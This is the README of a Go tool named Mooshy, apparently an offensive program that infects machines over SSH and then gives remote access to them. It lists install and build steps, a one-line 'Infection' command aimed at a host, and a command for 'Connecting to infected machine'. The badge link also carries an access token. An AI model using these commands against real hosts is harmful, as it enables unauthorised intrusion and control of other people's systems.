[![Build Status](https://travis-ci.com/rvolosatovs/mooshy.svg?token=Rr1zHeZEE84zs4P7sgSv&branch=master)](https://travis-ci.com/rvolosatovs/mooshy)

# Mooshy

[![asciicast](https://asciinema.org/a/zK5uZERZHIAw1TsNng2o8eDqX.png)](https://asciinema.org/a/zK5uZERZHIAw1TsNng2o8eDqX)

Installation:
```sh
    go get -u -v github.com/rvolosatovs/mooshy/cmd/mooshy
```

Development:
```sh
    make deps # only first time
    make
```

Infection:
```sh
    mooshy -ssh -addr <host>
```

Connecting to infected machine:
```sh
    mooshy -addr <host>
```
